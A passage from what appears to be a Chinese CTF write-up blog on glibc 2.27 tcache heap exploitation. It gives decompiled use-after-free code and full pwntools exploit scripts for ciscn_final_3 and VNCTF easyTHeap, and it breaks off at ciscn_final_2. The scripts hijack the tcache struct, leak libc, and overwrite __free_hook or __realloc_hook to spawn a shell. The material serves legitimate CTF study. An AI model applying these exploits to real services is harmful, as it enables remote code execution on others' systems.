BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v0 = <span class="hljs-built_in">std</span>::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">&quot;input the index&quot;</span>);<br>  <span class="hljs-built_in">std</span>::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v0, &amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>&lt;<span class="hljs-keyword">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);<br>  <span class="hljs-built_in">std</span>::istream::<span class="hljs-keyword">operator</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>, &amp;v2);<br>  <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0x18</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)&amp;unk_2022A0 + v2)); <span class="hljs-comment">//存在uaf漏洞，可以double free</span><br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>限制了堆块最大为0x78，那么就无法进入unsorted bin，可以通过合并两个chunk为0x100，同时劫持tcache struct来绕过tcache_perthread_struct对于count的检查。</li><li>0x100chunk被free到unsorted bin后，利用uaf申请到main_arena+96处的空间，从而泄露libc。</li><li>再次double free，并劫持tcache chunk的next指针（类似于fastbin的fd指针）到free_hook处，修改free_hook为system，由于之前已经在堆上布置好/bin/sh\x00，这时free chunk后便可getshell.</li></ul><p>贴一个tcache struct在堆中的布局，因此我们可以劫持count的数量和entry链表的起始<br><img src="https://i.loli.net/2021/05/01/BkdLJS3cGgWmMsb.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">这一题学到了利用tcache struct进行攻击，可以任意修改count和tcache entry</span><br><span class="hljs-string">而且只要把指定大小chunk的tcache填满，free时就不会进入tcache，大小合适的话就可以进入unsorted bin</span><br><span class="hljs-string">从而获取main_arena</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28493</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./ciscn_final_3&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_final_3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;pid&quot;</span> + <span class="hljs-built_in">str</span>(proc.pidof(p))<br>    raw_input(<span class="hljs-string">&#x27;--&gt;&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">idx, size, content</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice &gt; &#x27;</span>)<br>    sl(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27;input the index&#x27;</span>)<br>    sl(idx)<br>    ru(<span class="hljs-string">&#x27;input the size&#x27;</span>)<br>    sl(size)<br>    ru(<span class="hljs-string">&#x27;now you can write something&#x27;</span>)<br>    s(content)<br>    ru(<span class="hljs-string">&#x27;gift :&#x27;</span>)<br>    ptr = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span> idx,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">hex</span>(ptr)<br>    <span class="hljs-keyword">return</span> ptr<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice &gt; &#x27;</span>)<br>    sl(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;input the index&#x27;</span>)<br>    sl(idx)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    <span class="hljs-comment"># tcachebin的范围是[0x20, 0x400]，超过0x400就会进入unsortedbin</span><br>    chunk0_addr = new(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>    tcache_struct = chunk0_addr-<span class="hljs-number">0x11e60</span><br>    new(<span class="hljs-number">1</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br>    <span class="hljs-comment"># debug()</span><br>    new(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x10</span>)<br>    <span class="hljs-comment"># new(3,0x50,&#x27;\x05&#x27;+&#x27;a&#x27;*3+&#x27;\x03&#x27;+&#x27;a&#x27;*(0x40-5) + p64(chunk0_addr-0x11e60))</span><br>    new(<span class="hljs-number">3</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>    new(<span class="hljs-number">4</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0x10</span>)<br>    <span class="hljs-comment"># debug()</span><br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    debug()<br>    new(<span class="hljs-number">5</span>,<span class="hljs-number">0x50</span>,p64(chunk0_addr-<span class="hljs-number">0x11e60</span>)) <span class="hljs-comment">#0</span><br>    new(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\x10&#x27;</span>) <span class="hljs-comment"># 0</span><br>    new(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\x05&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">3</span>+<span class="hljs-string">&#x27;\x03&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">5</span>)+p64(chunk0_addr+<span class="hljs-number">0x50</span>)) <span class="hljs-comment"># chunk1</span><br>    new(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>))<br><br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 释放进unsorted bin</span><br>    new(<span class="hljs-number">9</span>,<span class="hljs-number">0x50</span>,p64(chunk0_addr+<span class="hljs-number">0x60</span>))<br>    new(<span class="hljs-number">10</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\xd0&#x27;</span>)<br>    new(<span class="hljs-number">11</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>)<br>    main_arena_96 = new(<span class="hljs-number">12</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\x40&#x27;</span>)<br>    libc_base = main_arena_96 - <span class="hljs-number">96</span> - <span class="hljs-number">0x3ebc40</span><br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;libc_base:&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;system:&quot;</span>,<span class="hljs-built_in">hex</span>(system)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;free_hook:&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook)<br><br>    delete(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">4</span>)<br>    new(<span class="hljs-number">13</span>,<span class="hljs-number">0x10</span>,p64(free_hook))<br>    new(<span class="hljs-number">14</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\xe8&#x27;</span>)<br>    new(<span class="hljs-number">15</span>,<span class="hljs-number">0x10</span>,p64(system))<br>    <br>    ru(<span class="hljs-string">&#x27;choice &gt;&#x27;</span>)<br>    sl(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;input the index&#x27;</span>)<br>    sl(<span class="hljs-number">3</span>)<br>    it()<br>    <span class="hljs-comment"># debug()</span><br><br><br>exp()<br></code></pre></div></td></tr></table></figure><h2 id="VNCTF-easyTHeap"><a href="#VNCTF-easyTHeap" class="headerlink" title="VNCTF easyTHeap"></a>VNCTF easyTHeap</h2><p>题一张tcache struct的图<br><img src="https://i.loli.net/2021/05/02/GLKYj7qnz2sRwEr.png"></p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  v1 = read_choice();<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; <span class="hljs-number">6</span> || !chunk_array_0x202080[v1] )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-keyword">void</span> *)chunk_array_0x202080[v1]);       <span class="hljs-comment">// uaf</span><br>  Size_array_0x202060[v1] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>存在uaf，可以tcache dup（已修复的洞）</li><li>使用chunk_array和size_array来保存chunk的地址和size，free后只会清零size但不会将chunk置零</li><li>还有两个全局变量限制了add次数最多为7，delete次数最多为3</li><li>show泄露double free后chunk的地址</li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li>先创建chunk0，然后double free，再show(0)便可以泄露出chunk0的地址，借此可以算出位于heap起始位置的tcache struct地址</li><li>修改chunk1（0）的next指针为tcache struct，申请到tcache struct处的空间，并劫持count，这样后续释放的chunk就会进入unsorted bin从而泄露main_arena</li><li>再次劫持tcache struct，修改count和entry为__realloc_hook，再add(0x10)申请到__realloc_hook处的空间</li><li>ogg + realloc抬栈getshell，这里抬栈的高度需要根据$rsp+0x40的值来确定，也可以反复调试得到</li></ol><p>exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28063</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)<br>one_gadget = [<span class="hljs-number">0x4f2c5</span>, <span class="hljs-number">0x4f322</span>, <span class="hljs-number">0x10a38c</span>]<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c        execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    log.success(<span class="hljs-string">&#x27;pid:%s&#x27;</span> % <span class="hljs-built_in">str</span>(proc.pidof(p)))<br>    raw_input(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>    sl(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27;size?&#x27;</span>)<br>    sl(size)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>    sl(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;idx?&#x27;</span>)<br>    sl(idx)<br>    ru(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>    s(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>    sl(<span class="hljs-number">3</span>)<br>    ru(<span class="hljs-string">&#x27;idx?&#x27;</span>)<br>    sl(idx)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>    sl(<span class="hljs-number">4</span>)<br>    ru(<span class="hljs-string">&#x27;idx?&#x27;</span>)<br>    sl(idx)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    add(<span class="hljs-number">0x50</span>) <span class="hljs-comment"># 0</span><br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0x50</span>) <span class="hljs-comment"># 1</span><br><br>    show(<span class="hljs-number">0</span>)<br>    heap_leak = uu64(r(<span class="hljs-number">6</span>))<br>    tcache_struct = heap_leak - <span class="hljs-number">0x250</span> <span class="hljs-comment"># 劫持的地址必须是tcache struct 的data</span><br>    log.success(<span class="hljs-string">&quot;heap leak:0x%x&quot;</span> % heap_leak)<br>    log.success(<span class="hljs-string">&quot;tcache struct:0x%x&quot;</span> % tcache_struct)<br><br>    edit(<span class="hljs-number">1</span>, p64(tcache_struct))<br><br>    add(<span class="hljs-number">0x50</span>) <span class="hljs-comment"># 2</span><br>    add(<span class="hljs-number">0x50</span>) <span class="hljs-comment"># 3 申请到tcache struct</span><br>    <span class="hljs-comment"># debug()</span><br>    edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;\x61&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># 劫持count</span><br>    delete(<span class="hljs-number">3</span>)<br><br>    show(<span class="hljs-number">3</span>) <span class="hljs-comment"># 泄露libc</span><br>    main_arena_96 = uu64(r(<span class="hljs-number">6</span>))<br>    log.success(<span class="hljs-string">&quot;&lt;main_arena+96&gt;:0x%x&quot;</span> % main_arena_96)<br>    libc_base = main_arena_96 - <span class="hljs-number">0x3ebca0</span><br>    log.success(<span class="hljs-string">&quot;libc base:0x%x&quot;</span> % libc_base)<br><br>    sys = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    re_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__realloc_hook&#x27;</span>]<br>    mac_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    realloc = libc_base + libc.symbols[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>    ogg = libc_base + one_gadget[<span class="hljs-number">1</span>]<br><br>    <span class="hljs-comment"># debug()</span><br>    add(<span class="hljs-number">0x50</span>) <span class="hljs-comment"># 4 </span><br>    edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;p&#x27;</span>*<span class="hljs-number">0x40</span>+p64(re_hook)) <span class="hljs-comment"># 劫持count和entry</span><br><br>    add(<span class="hljs-number">0x10</span>) <span class="hljs-comment"># 5 申请到realloc</span><br>    edit(<span class="hljs-number">5</span>,p64(ogg) + p64(realloc + <span class="hljs-number">8</span>)) <span class="hljs-comment"># 常规的realloc抬栈</span><br>    add(<span class="hljs-number">0x10</span>) <span class="hljs-comment"># getshell</span><br>    it()   <br><br>exp()<br></code></pre></div></td></tr></table></figure><h2 id="ciscn-final-2"><a href="#ciscn-final-2" class="headerlink" title="ciscn_final_2"></a>ciscn_final_2</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./ciscn_final_2&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_final_2&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)<br>one_gadget = [<span class="hljs-number">0x4f2c5</span>, <span class="hljs-number">0x4f322</span>, <span 